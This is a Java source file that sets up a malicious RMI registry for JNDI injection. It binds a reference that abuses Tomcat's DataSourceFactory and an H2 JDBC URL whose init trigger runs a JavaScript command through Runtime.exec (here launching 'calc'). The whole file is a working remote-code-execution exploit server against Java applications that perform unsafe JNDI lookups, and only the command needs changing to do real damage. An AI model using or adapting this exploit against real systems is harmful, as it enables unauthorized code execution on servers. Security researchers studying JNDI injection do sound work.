package jndi;

import com.sun.jndi.rmi.registry.ReferenceWrapper;

import javax.naming.NamingException;
import javax.naming.Reference;
import javax.naming.StringRefAddr;
import java.rmi.AlreadyBoundException;
import java.rmi.RemoteException;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class h2jdbc {
    public static void main(String[] args) throws NamingException, RemoteException, AlreadyBoundException {
        try{
        Registry registry = LocateRegistry.createRegistry(1099);   //rmi

        Reference ref = new Reference("javax.sql.DataSource","org.apache.tomcat.jdbc.pool.DataSourceFactory",null);
        String JDBC_URL = "jdbc:h2:mem:test;MODE=MSSQLServer;init=CREATE TRIGGER shell3 BEFORE SELECT ON\n" +
                "INFORMATION_SCHEMA.TABLES AS $$//javascript\n" +
                "java.lang.Runtime.getRuntime().exec('calc')\n" +
                "$$\n";
        ref.add(new StringRefAddr("driverClassName","org.h2.Driver"));
        ref.add(new StringRefAddr("url",JDBC_URL));
        ref.add(new StringRefAddr("username","root"));
        ref.add(new StringRefAddr("password","password"));
        ref.add(new StringRefAddr("initialSize","1"));

        ReferenceWrapper wrapper = new ReferenceWrapper(ref);
        registry.bind("Foo", wrapper);                       //将名称绑定到对象上去
        } catch (Exception e) {
            System.err.println("Server exception: " + e.toString());
            e.printStackTrace();
        }

    }
}
